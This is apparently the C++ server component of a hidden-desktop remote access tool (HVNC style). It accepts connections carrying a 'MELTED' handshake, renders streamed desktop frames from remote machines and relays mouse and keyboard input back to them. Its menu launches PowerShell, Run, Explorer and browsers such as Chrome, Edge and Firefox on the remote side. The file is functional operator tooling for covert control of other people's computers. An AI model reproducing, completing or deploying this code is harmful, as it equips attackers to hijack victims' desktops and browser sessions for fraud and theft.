#include "Server.h"
#include "../common/ScreenTransfer/ScreenCodec.h"

#include <GdiPlus.h>
#include <vector>


typedef NTSTATUS (NTAPI *T_RtlDecompressBuffer)
(
   USHORT CompressionFormat,
   PUCHAR UncompressedBuffer,
   ULONG  UncompressedBufferSize,
   PUCHAR CompressedBuffer,
   ULONG  CompressedBufferSize,
   PULONG FinalUncompressedSize
);

static T_RtlDecompressBuffer pRtlDecompressBuffer;

enum Connection { desktop, input, end };

struct InputMessage
{
   DWORD msg;
   DWORD wParam;
   DWORD lParam;
};

struct Client
{
   SOCKET connections[Connection::end];
   DWORD  uhid;
   DWORD  sessionId;
   HWND   hWnd;
   BYTE  *pixels;
   DWORD  pixelsWidth, pixelsHeight;
   DWORD  screenWidth, screenHeight;
   HDC    hDcBmp;
   HBITMAP hBmp;
   HGDIOBJ hOldBmp;
   HANDLE minEvent;
   BOOL   fullScreen;
   RECT   windowedRect;
};

static const COLORREF gc_trans              = RGB(255, 174, 201);
static const BYTE     gc_magik[]            = { 'M', 'E', 'L', 'T', 'E', 'D', 0 };
static const DWORD    gc_maxClients         = 256;
static const DWORD    gc_sleepNotRecvPixels = 33;
static const DWORD    gc_socketTimeoutMs    = 5000;

static const DWORD    gc_minWindowWidth  = 800;
static const DWORD    gc_minWindowHeight = 600;


enum SysMenuIds   { fullScreen = 101, startExplorer = WM_USER + 1, startRun, startChrome, startEdge, startBrave, startFirefox, startIexplore, startPowershell };

static Client           g_clients[gc_maxClients];
static DWORD            g_nextSessionId = 1;
static CRITICAL_SECTION g_critSec;
static ULONG_PTR        g_gdiplusToken = 0;
static BOOL             g_gdiplusStarted = FALSE;

static const TCHAR *ConnectionName(int connection)
{
   switch(connection)
   {
      case Connection::desktop:
         return TEXT("desktop");
      case Connection::input:
         return TEXT("input");
      default:
         return TEXT("unknown");
   }
}

static void GetPeerIp(SOCKET s, char *ip, int ipSize)
{
   if(ipSize <= 0)
      return;

   ip[0] = 0;

   SOCKADDR_IN addr;
   int         addrSize = sizeof(addr);
   if(getpeername(s, (SOCKADDR *) &addr, &addrSize) == 0)
      lstrcpynA(ip, inet_ntoa(addr.sin_addr), ipSize);

   if(!ip[0])
      lstrcpynA(ip, "unknown", ipSize);
}

static void ConfigureSocketTimeouts(SOCKET s)
{
   DWORD timeout = gc_socketTimeoutMs;
   // Keep receive operations blocking. The input channel may legitimately sit idle
   // until the user clicks or types, but sends should not block the UI forever.
   setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (const char *) &timeout, sizeof(timeout));
}

static DWORD CreateSessionId()
{
   DWORD sessionId = g_nextSessionId++;
   if(!g_nextSessionId)
      g_nextSessionId = 1;
   return sessionId;
}

static Client *GetClientByUhid(DWORD uhid)
{
   for(int i = 0; i < gc_maxClients; ++i)
   {
      if(g_clients[i].uhid == uhid)
         return &g_clients[i];
   }
   return NULL;
}

static Client *GetClientByUhidAndSession(DWORD uhid, DWORD sessionId)
{
   for(int i = 0; i < gc_maxClients; ++i)
   {
      if(g_clients[i].uhid == uhid && g_clients[i].sessionId == sessionId)
         return &g_clients[i];
   }
   return NULL;
}

static Client *GetClientByHwnd(HWND hWnd)
{
   for(int i = 0; i < gc_maxClients; ++i)
   {
      if(g_clients[i].hWnd == hWnd)
         return &g_clients[i];
   }
   return NULL;
}

static void DeleteClientBitmap(HDC hDcBmp, HBITMAP hBmp, HGDIOBJ hOldBmp)
{
   if(hDcBmp && hOldBmp)
      SelectObject(hDcBmp, hOldBmp);
   if(hBmp)
      DeleteObject(hBmp);
   if(hDcBmp)
      DeleteDC(hDcBmp);
}

static BOOL SendAll(SOCKET s, const void *buffer, int size)
{
   const char *data = (const char *) buffer;
   int sent = 0;
   while(sent != size)
   {
      int ret = send(s, data + sent, size - sent, 0);
      if(ret <= 0)
         return FALSE;
      sent += ret;
   }
   return TRUE;
}

static BOOL RecvAll(SOCKET s, void *buffer, int size)
{
   char *data = (char *) buffer;
   int received = 0;
   while(received != size)
   {
      int ret = recv(s, data + received, size - received, 0);
      if(ret <= 0)
         return FALSE;
      received += ret;
   }
   return TRUE;
}

static BOOL SendInt(SOCKET s, int i)
{
   return SendAll(s, &i, (int) sizeof(i));
}

static BOOL RecvInt(SOCKET s, int *i)
{
   return RecvAll(s, i, (int) sizeof(*i));
}

static BOOL RecvPositiveDword(SOCKET s, DWORD *value)
{
   int received;
   if(!RecvInt(s, &received) || received <= 0)
      return FALSE;
   *value = (DWORD) received;
   return TRUE;
}

static BOOL RecvScreenPacket(SOCKET s, std::vector<BYTE>& packet)
{
   int packetSize = 0;
   if(!RecvInt(s, &packetSize) || packetSize <= 0 || packetSize > (int) screen2::MAX_WIRE_PACKET_SIZE)
      return FALSE;
   packet.resize((size_t) packetSize);
   return RecvAll(s, packet.data(), packetSize);
}

static BOOL SendInputMessage(SOCKET s, UINT msg, WPARAM wParam, LPARAM lParam)
{
   InputMessage input;
   input.msg = (DWORD) msg;
   input.wParam = (DWORD) wParam;
   input.lParam = (DWORD) lParam;
   return SendAll(s, &input, (int) sizeof(input));
}

static const TCHAR *InputMsgName(UINT msg)
{
   switch(msg)
   {
      case WM_LBUTTONDOWN: return TEXT("WM_LBUTTONDOWN");
      case WM_LBUTTONUP: return TEXT("WM_LBUTTONUP");
      case WM_RBUTTONDOWN: return TEXT("WM_RBUTTONDOWN");
      case WM_RBUTTONUP: return TEXT("WM_RBUTTONUP");
      case WM_MBUTTONDOWN: return TEXT("WM_MBUTTONDOWN");
      case WM_MBUTTONUP: return TEXT("WM_MBUTTONUP");
      case WM_MOUSEMOVE: return TEXT("WM_MOUSEMOVE");
      case WM_MOUSEWHEEL: return TEXT("WM_MOUSEWHEEL");
      case WM_CHAR: return TEXT("WM_CHAR");
      case WM_KEYDOWN: return TEXT("WM_KEYDOWN");
      case WM_KEYUP: return TEXT("WM_KEYUP");
      case WM_SYSCHAR: return TEXT("WM_SYSCHAR");
      case WM_SYSKEYDOWN: return TEXT("WM_SYSKEYDOWN");
      case WM_SYSKEYUP: return TEXT("WM_SYSKEYUP");
      default: return TEXT("UNKNOWN");
   }
}

static BOOL ShouldLogInput(UINT msg)
{
   static DWORD moveCount = 0;
   if(msg == WM_MOUSEMOVE)
   {
      ++moveCount;
      return (moveCount % 60) == 1;
   }
   return TRUE;
}

static void SendClientInput(Client *client, UINT msg, WPARAM wParam, LPARAM lParam)
{
   SOCKET inputSocket = INVALID_SOCKET;
   HWND   hWnd = NULL;

   EnterCriticalSection(&g_critSec);
   if(client && client->connections[Connection::input])
   {
      inputSocket = client->connections[Connection::input];
      hWnd = client->hWnd;
   }
   LeaveCriticalSection(&g_critSec);

   if(inputSocket == INVALID_SOCKET)
      return;

   BOOL sent = SendInputMessage(inputSocket, msg, wParam, lParam);
   if(ShouldLogInput(msg))
      wprintf(TEXT("[input] send %s wParam=0x%Ix lParam=0x%Ix result=%s\n"), InputMsgName(msg), wParam, lParam, sent ? TEXT("ok") : TEXT("failed"));

   if(!sent && hWnd)
      PostMessage(hWnd, WM_CLOSE, 0, 0);
}

static void ToggleFullscreen(HWND hWnd, Client *client)
{
   if(!client->fullScreen)
   {
      RECT rect;
      GetWindowRect(hWnd, &rect);
      client->windowedRect = rect;
      GetWindowRect(GetDesktopWindow(), &rect);
      SetWindowLong(hWnd, GWL_STYLE, WS_POPUP | WS_VISIBLE);
      SetWindowPos(hWnd, HWND_TOPMOST, 0, 0, rect.right, rect.bottom, SWP_SHOWWINDOW);
   }
   else
   {
      SetWindowLong(hWnd, GWL_STYLE, WS_OVERLAPPEDWINDOW | WS_VISIBLE);
      SetWindowPos(hWnd,
         HWND_NOTOPMOST,
         client->windowedRect.left,
         client->windowedRect.top,
         client->windowedRect.right - client->windowedRect.left,
         client->windowedRect.bottom - client->windowedRect.top,
         SWP_SHOWWINDOW);
   }
   client->fullScreen = !client->fullScreen;
}

static LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
   Client *client = GetClientByHwnd(hWnd);

   switch(msg)
   {
      case WM_CREATE:
      {
         HMENU hSysMenu = GetSystemMenu(hWnd, false);
         AppendMenu(hSysMenu, MF_SEPARATOR, 0, NULL);

         AppendMenu(hSysMenu, MF_STRING, SysMenuIds::fullScreen,     TEXT("&Fullscreen"));
         AppendMenu(hSysMenu, MF_STRING, SysMenuIds::startExplorer,  TEXT("Start Explorer"));
         AppendMenu(hSysMenu, MF_STRING, SysMenuIds::startRun,       TEXT("&Run..."));
         AppendMenu(hSysMenu, MF_STRING, SysMenuIds::startPowershell, TEXT("Start Powershell"));
         AppendMenu(hSysMenu, MF_STRING, SysMenuIds::startChrome,    TEXT("Start Chrome"));
         AppendMenu(hSysMenu, MF_STRING, SysMenuIds::startBrave, TEXT("Start Brave"));
         AppendMenu(hSysMenu, MF_STRING, SysMenuIds::startEdge,    TEXT("Start Edge"));
         AppendMenu(hSysMenu, MF_STRING, SysMenuIds::startFirefox,   TEXT("Start Firefox"));
         AppendMenu(hSysMenu, MF_STRING, SysMenuIds::startIexplore,  TEXT("Start Internet Explorer"));
         break;
      }
      case WM_SYSCOMMAND:
      {
         if(!client)
            return DefWindowProc(hWnd, msg, wParam, lParam);

/*
         if(wParam == SysMenuIds::fullScreen || (wParam == SC_KEYMENU && toupper(lParam) == 'F'))
         {
            ToggleFullscreen(hWnd, client);
            break;
         }
*/
         switch(wParam)
         {
            case SC_RESTORE:
               if(client->minEvent)
                  SetEvent(client->minEvent);
               return DefWindowProc(hWnd, msg, wParam, lParam);
            case SysMenuIds::startExplorer:
            case SysMenuIds::startRun:
            case SysMenuIds::startPowershell:
            case SysMenuIds::startChrome:
            case SysMenuIds::startBrave:
            case SysMenuIds::startEdge:
            case SysMenuIds::startFirefox:
            case SysMenuIds::startIexplore:
               SendClientInput(client, (UINT) wParam, NULL, NULL);
               break;
            default:
               return DefWindowProc(hWnd, msg, wParam, lParam);
         }
         break;
      }
      case WM_PAINT:
      {
         PAINTSTRUCT ps;
         HDC         hDc = BeginPaint(hWnd, &ps);

         RECT clientRect;
         GetClientRect(hWnd, &clientRect);

         RECT rect;
         HBRUSH hBrush = CreateSolidBrush(RGB(0, 0, 0));
         rect.left = 0;
         rect.top = 0;
         rect.right = clientRect.right;
         rect.bottom = clientRect.bottom;
         FillRect(hDc, &rect, hBrush);

         if(client && client->hDcBmp && client->pixelsWidth && client->pixelsHeight)
         {
            BitBlt(hDc, 0, 0, client->pixelsWidth, client->pixelsHeight, client->hDcBmp, 0, 0, SRCCOPY);
         }
         else
         {
            SetTextColor(hDc, RGB(220, 220, 220));
            SetBkMode(hDc, TRANSPARENT);
            DrawText(hDc, TEXT("Waiting for first desktop frame..."), -1, &rect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
         }
         DeleteObject(hBrush);
         EndPaint(hWnd, &ps);
         break;
      }
      case WM_DESTROY:
      {
         PostQuitMessage(0);
         break;
      }
      case WM_ERASEBKGND:
         return TRUE;
      case WM_LBUTTONDOWN:
      case WM_LBUTTONUP:
      case WM_RBUTTONDOWN:
      case WM_RBUTTONUP:
      case WM_MBUTTONDOWN:
      case WM_MBUTTONUP:
      case WM_LBUTTONDBLCLK:
      case WM_RBUTTONDBLCLK:
      case WM_MBUTTONDBLCLK:
      case WM_MOUSEMOVE:
      case WM_MOUSEWHEEL:
      {
         if(!client || !client->pixelsWidth || !client->pixelsHeight || !client->screenWidth || !client->screenHeight)
            break;

         if(msg == WM_MOUSEMOVE && GetKeyState(VK_LBUTTON) >= 0)
            break;

         int x = GET_X_LPARAM(lParam);
         int y = GET_Y_LPARAM(lParam);

         float ratioX = (float) client->screenWidth / client->pixelsWidth;
         float ratioY = (float) client->screenHeight / client->pixelsHeight;

         x = (int) (x * ratioX);
         y = (int) (y * ratioY);
         lParam = MAKELPARAM(x, y);
         SendClientInput(client, msg, wParam, lParam);
         break;
      }
      case WM_CHAR:
      case WM_SYSCHAR:
      {
         if(!client)
            break;
         if(iscntrl(wParam))
            break;
         SendClientInput(client, msg, wParam, 0);
         break;
      }
      case WM_KEYDOWN:
      case WM_KEYUP:
      case WM_SYSKEYDOWN:
      case WM_SYSKEYUP:
      {
         if(!client)
            break;
         SendClientInput(client, msg, wParam, 0);
         break;
      }
      case WM_GETMINMAXINFO:
      {
         MINMAXINFO* mmi = (MINMAXINFO *) lParam;
         mmi->ptMinTrackSize.x = gc_minWindowWidth;
         mmi->ptMinTrackSize.y = gc_minWindowHeight;
         if (client)
         {
         mmi->ptMaxTrackSize.x = client->screenWidth;
         mmi->ptMaxTrackSize.y = client->screenHeight;
         }
         break;
      }
      default:
         return DefWindowProc(hWnd, msg, wParam, lParam);
    }
    return 0;
}

static DWORD WINAPI ClientThread(PVOID param)
{
   Client    *client = NULL;
   SOCKET     s = (SOCKET) param;
   BYTE       buf[sizeof(gc_magik)];
   int        connection;
   DWORD      uhid;
   char       peerIp[16];

   GetPeerIp(s, peerIp, sizeof(peerIp));
   wprintf(TEXT("[diag] Incoming socket accepted from %hs\n"), peerIp);

   if(!RecvAll(s, buf, (int) sizeof(gc_magik)))
   {
      wprintf(TEXT("[!] Handshake failed from %hs: magic was not received\n"), peerIp);
      closesocket(s);
      return 0;
   }
   if(memcmp(buf, gc_magik, sizeof(gc_magik)))
   {
      wprintf(TEXT("[!] Handshake failed from %hs: bad magic\n"), peerIp);
      closesocket(s);
      return 0;
   }
   if(!RecvInt(s, &connection))
   {
      wprintf(TEXT("[!] Handshake failed from %hs: channel id was not received\n"), peerIp);
      closesocket(s);
      return 0;
   }
   wprintf(TEXT("[diag] %s channel requested by %hs\n"), ConnectionName(connection), peerIp);
   {
      SOCKADDR_IN addr;
      int         addrSize;
      addrSize = sizeof(addr);
      getpeername(s, (SOCKADDR *) &addr, &addrSize);
      uhid = addr.sin_addr.S_un.S_addr;
   }
   if(connection == Connection::desktop)
   {
      DWORD sessionId;
      {
         int receivedSessionId;
         if(!RecvInt(s, &receivedSessionId) || !receivedSessionId)
         {
            wprintf(TEXT("[!] Desktop channel rejected from %hs: invalid session id\n"), peerIp);
            closesocket(s);
            return 0;
         }
         sessionId = (DWORD) receivedSessionId;
      }

      EnterCriticalSection(&g_critSec);
      client = GetClientByUhidAndSession(uhid, sessionId);
      if(!client || client->connections[Connection::desktop])
      {
         wprintf(TEXT("[!] Desktop channel rejected from %hs: no matching input session or duplicate desktop channel (session %lu)\n"), peerIp, sessionId);
         LeaveCriticalSection(&g_critSec);
         closesocket(s);
         return 0;
      }
      client->connections[Connection::desktop] = s;
      LeaveCriticalSection(&g_critSec);
      wprintf(TEXT("[+] Desktop channel connected: %hs (session %lu)\n"), peerIp, sessionId);

      screen2::ScreenFrameDecoder decoder;
      DWORD announcedScreenWidth = 0;
      DWORD announcedScreenHeight = 0;
      BOOL firstFrameLogged = FALSE;
      for(;;)
      {
         std::vector<BYTE> packet;
         if(!RecvScreenPacket(s, packet))
            goto exit;

         SCREEN_SIZE_MSG sizeMsg = {};
         if(screen2::TryParseScreenSizePacket(packet.data(), packet.size(), sizeMsg))
         {
            announcedScreenWidth = sizeMsg.width > 0 ? (DWORD) sizeMsg.width : 0;
            announcedScreenHeight = sizeMsg.height > 0 ? (DWORD) sizeMsg.height : 0;
            wprintf(TEXT("[diag] SCREEN2 size: %hs (session %lu), virtual=(%d,%d), screen=%lux%lu\n"),
               peerIp, sessionId, sizeMsg.virtualX, sizeMsg.virtualY, announcedScreenWidth, announcedScreenHeight);
            continue;
         }

         screen2::DecodedFrame frame;
         bool needsKeyframe = false;
         if(!decoder.DecodePacket(packet.data(), packet.size(), frame, needsKeyframe))
         {
            wprintf(TEXT("[!] SCREEN2 frame decode failed: %hs (session %lu), requestKeyframe=%u, packet=%zu bytes\n"),
               peerIp, sessionId, needsKeyframe ? 1U : 0U, packet.size());
            if(!SendInt(s, needsKeyframe ? 1 : 0))
               goto exit;
            continue;
         }

         DWORD width = (DWORD) frame.width;
         DWORD height = (DWORD) frame.height;
         if(!width || !height || frame.stride < frame.width * 3 || frame.pixels.empty() || frame.pixels.size() > MAXDWORD)
            goto exit;
         DWORD newPixelsSize = (DWORD) frame.pixels.size();
         BYTE *newPixels = (BYTE *) malloc(newPixelsSize);
         if(!newPixels)
            goto exit;
         memcpy(newPixels, frame.pixels.data(), newPixelsSize);

         EnterCriticalSection(&g_critSec);
         BOOL frameReady = FALSE;
         if(!client->hWnd ||
            client->uhid != uhid ||
            client->sessionId != sessionId ||
            client->connections[Connection::desktop] != s)
         {
            LeaveCriticalSection(&g_critSec);
            free(newPixels);
            return 0;
         }
         {
            BYTE   *oldPixels = NULL;
            HDC     hDc = GetDC(NULL);
            HDC     hDcBmp = NULL;
            HBITMAP hBmp = NULL;
            HGDIOBJ hOldBmp = NULL;
            HDC     oldDcBmp = NULL;
            HBITMAP oldBmp = NULL;
            HGDIOBJ oldSelectedObject = NULL;

            if(!hDc)
               goto frame_cleanup;

            hDcBmp = CreateCompatibleDC(hDc);
            if(!hDcBmp)
               goto frame_cleanup;

            hBmp = CreateCompatibleBitmap(hDc, width, height);
            if(!hBmp)
               goto frame_cleanup;

            BITMAPINFO bmpInfo;
            memset(&bmpInfo, 0, sizeof(bmpInfo));
            bmpInfo.bmiHeader.biSize = sizeof(bmpInfo.bmiHeader);
            bmpInfo.bmiHeader.biPlanes = 1;
            bmpInfo.bmiHeader.biBitCount = 24;
            bmpInfo.bmiHeader.biCompression = BI_RGB;
            bmpInfo.bmiHeader.biClrUsed = 0;
            bmpInfo.bmiHeader.biSizeImage = newPixelsSize;
            bmpInfo.bmiHeader.biWidth = width;
            bmpInfo.bmiHeader.biHeight = -((LONG) height);
            if(SetDIBits(hDcBmp,
               hBmp,
               0,
               height,
               newPixels,
               &bmpInfo,
               DIB_RGB_COLORS) != (int) height)
            {
               goto frame_cleanup;
            }

            hOldBmp = SelectObject(hDcBmp, hBmp);
            if(!hOldBmp)
               goto frame_cleanup;

            oldDcBmp = client->hDcBmp;
            oldBmp = client->hBmp;
            oldSelectedObject = client->hOldBmp;
            oldPixels = client->pixels;

            client->screenWidth = announcedScreenWidth ? announcedScreenWidth : width;
            client->screenHeight = announcedScreenHeight ? announcedScreenHeight : height;
            client->pixels = newPixels;
            client->pixelsWidth = width;
            client->pixelsHeight = height;
            client->hDcBmp = hDcBmp;
            client->hBmp = hBmp;
            client->hOldBmp = hOldBmp;

            newPixels = NULL;
            hDcBmp = NULL;
            hBmp = NULL;
            hOldBmp = NULL;
            frameReady = TRUE;

            DeleteClientBitmap(oldDcBmp, oldBmp, oldSelectedObject);
            free(oldPixels);

            InvalidateRgn(client->hWnd, NULL, TRUE);

frame_cleanup:
            DeleteClientBitmap(hDcBmp, hBmp, hOldBmp);
            if(hDc)
               ReleaseDC(NULL, hDc);
            if(!frameReady)
               free(newPixels);
         }
         LeaveCriticalSection(&g_critSec);

         if(!frameReady)
            goto exit;

         if(!firstFrameLogged)
         {
            wprintf(TEXT("[+] First SCREEN2 desktop frame rendered: %hs (session %lu), remote=%lux%lu, frame=%lux%lu, packet=%zu bytes\n"),
               peerIp,
               sessionId,
               announcedScreenWidth ? announcedScreenWidth : width,
               announcedScreenHeight ? announcedScreenHeight : height,
               width,
               height,
               packet.size());
            firstFrameLogged = TRUE;
         }

         if(!SendInt(s, 0))
            goto exit;
      }
exit:
      wprintf(TEXT("[!] Desktop channel closed: %hs (session %lu)\n"), peerIp, sessionId);
      EnterCriticalSection(&g_critSec);
      if(client->uhid == uhid &&
         client->sessionId == sessionId &&
         client->connections[Connection::desktop] == s &&
         client->hWnd)
      {
         PostMessage(client->hWnd, WM_CLOSE, 0, 0);
      }
      LeaveCriticalSection(&g_critSec);
      return 0;
   }
   else if(connection == Connection::input)
   {
      char ip[16];
      DWORD sessionId;
      EnterCriticalSection(&g_critSec);
      {
         client = GetClientByUhid(uhid);
         if(client)
         {
            wprintf(TEXT("[!] Input channel rejected from %hs: client already connected\n"), peerIp);
            closesocket(s);
            LeaveCriticalSection(&g_critSec);
            return 0;
         }
         IN_ADDR addr;
         addr.S_un.S_addr = uhid;
         strcpy(ip, inet_ntoa(addr));
         wprintf(TEXT("[+] New Connection: %hs\n"), ip);

         BOOL found = FALSE;
         for(int i = 0; i < gc_maxClients; ++i)
         {
            if(!g_clients[i].hWnd)
            {
               found = TRUE;
               client = &g_clients[i];
            }
         }
         if(!found)
         {
            wprintf(TEXT("[!] Client %hs Disconnected: Maximum %d Clients Allowed\n"), ip, gc_maxClients);
            closesocket(s);
            LeaveCriticalSection(&g_critSec);
            return 0;
         }

         client->uhid = uhid;
         client->sessionId = CreateSessionId();
         sessionId = client->sessionId;
         client->connections[Connection::input] = s;

         client->hWnd = CW_Create(uhid, gc_minWindowWidth, gc_minWindowHeight);
         if(client->hWnd)
            wprintf(TEXT("[+] Control window created for %hs: hwnd=0x%p\n"), ip, client->hWnd);
         else
         {
            wprintf(TEXT("[!] Control window creation failed for %hs: GetLastError=%lu\n"), ip, GetLastError());
            closesocket(s);
            memset(client, 0, sizeof(*client));
            LeaveCriticalSection(&g_critSec);
            return 0;
         }

         client->minEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
         if(client->minEvent)
            wprintf(TEXT("[diag] Minimize/restore event created for %hs\n"), ip);
         else
         {
            wprintf(TEXT("[!] CreateEvent failed for %hs: GetLastError=%lu\n"), ip, GetLastError());
            DestroyWindow(client->hWnd);
            closesocket(s);
            memset(client, 0, sizeof(*client));
            LeaveCriticalSection(&g_critSec);
            return 0;
         }
      }
      LeaveCriticalSection(&g_critSec);

      if(SendInt(s, (int) sessionId))
         wprintf(TEXT("[+] Input channel ready: %hs (session %lu)\n"), ip, sessionId);
      else
      {
         wprintf(TEXT("[!] Failed to send session id to %hs\n"), ip);
         return 0;
      }

      MSG msg;
      while(GetMessage(&msg, NULL, 0, 0) > 0)
      {
         PeekMessage(&msg, NULL, WM_USER, WM_USER, PM_NOREMOVE);
         TranslateMessage(&msg);
         DispatchMessage(&msg);
      }

      EnterCriticalSection(&g_critSec);
      {
         wprintf(TEXT("[!] Client %hs Disconnected\n"), ip);
         free(client->pixels);
         DeleteClientBitmap(client->hDcBmp, client->hBmp, client->hOldBmp);
         closesocket(client->connections[Connection::input]);
         closesocket(client->connections[Connection::desktop]);
         CloseHandle(client->minEvent);
         memset(client, 0, sizeof(*client));
      }
      LeaveCriticalSection(&g_critSec);
   }
   else
      closesocket(s);
   return 0;
}

BOOL StartServer(int port)
{
   WSADATA     wsa;
   SOCKET      serverSocket;
   sockaddr_in addr;
   HMODULE     ntdll = LoadLibrary(TEXT("ntdll.dll"));

   if(!ntdll)
   {
      wprintf(TEXT("[!] LoadLibrary(ntdll.dll) failed: GetLastError=%lu\n"), GetLastError());
      return FALSE;
   }

   pRtlDecompressBuffer = (T_RtlDecompressBuffer) GetProcAddress(ntdll, "RtlDecompressBuffer");
   if(!pRtlDecompressBuffer)
   {
      wprintf(TEXT("[!] GetProcAddress(RtlDecompressBuffer) failed: GetLastError=%lu\n"), GetLastError());
      return FALSE;
   }

   InitializeCriticalSection(&g_critSec);
   memset(g_clients, 0, sizeof(g_clients));

   Gdiplus::GdiplusStartupInput gdiplusStartupInput;
   if(Gdiplus::GdiplusStartup(&g_gdiplusToken, &gdiplusStartupInput, NULL) == Gdiplus::Ok)
   {
      g_gdiplusStarted = TRUE;
      wprintf(TEXT("[diag] GDI+ startup: ok\n"));
   }
   else
      wprintf(TEXT("[!] GDI+ startup failed; SCREEN2 JPEG decode may fail\n"));

   if(CW_Register(WndProc))
      wprintf(TEXT("[diag] Control window class registered\n"));
   else
   {
      DWORD err = GetLastError();
      if(err == ERROR_CLASS_ALREADY_EXISTS)
         wprintf(TEXT("[diag] Control window class already registered\n"));
      else
      {
         wprintf(TEXT("[!] Control window class registration failed: GetLastError=%lu\n"), err);
         return FALSE;
      }
   }

   if(WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
   {
      wprintf(TEXT("[!] WSAStartup failed: WSAGetLastError=%d\n"), WSAGetLastError());
      return FALSE;
   }
   if((serverSocket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
   {
      wprintf(TEXT("[!] socket() failed: WSAGetLastError=%d\n"), WSAGetLastError());
      return FALSE;
   }

   addr.sin_family      = AF_INET;
   addr.sin_addr.s_addr = INADDR_ANY;
   addr.sin_port        = htons(port);

   if(bind(serverSocket, (sockaddr *) &addr, sizeof(addr)) == SOCKET_ERROR)
   {
      wprintf(TEXT("[!] bind() failed on port %d: WSAGetLastError=%d\n"), port, WSAGetLastError());
      return FALSE;
   }
   if(listen(serverSocket, SOMAXCONN) == SOCKET_ERROR)
   {
      wprintf(TEXT("[!] listen() failed: WSAGetLastError=%d\n"), WSAGetLastError());
      return FALSE;
   }

   int addrSize = sizeof(addr);
   getsockname(serverSocket, (sockaddr *) &addr, &addrSize);
   wprintf(TEXT("[+] Listening on Port: %d\n\n"), ntohs(addr.sin_port));

   for(;;)
   {
      SOCKET      s;
      sockaddr_in addr;
      int         addrSize = sizeof(addr);
      s = accept(serverSocket, (sockaddr *) &addr, &addrSize);
      if(s == INVALID_SOCKET)
         continue;
      int one = 1;
      setsockopt(s, IPPROTO_TCP, TCP_NODELAY, (const char *) &one, sizeof(one));
      ConfigureSocketTimeouts(s);
      HANDLE h = CreateThread(NULL, 0, ClientThread, (LPVOID) s, 0, 0);
      if(h)
         CloseHandle(h);
      else
         closesocket(s);
   }
}
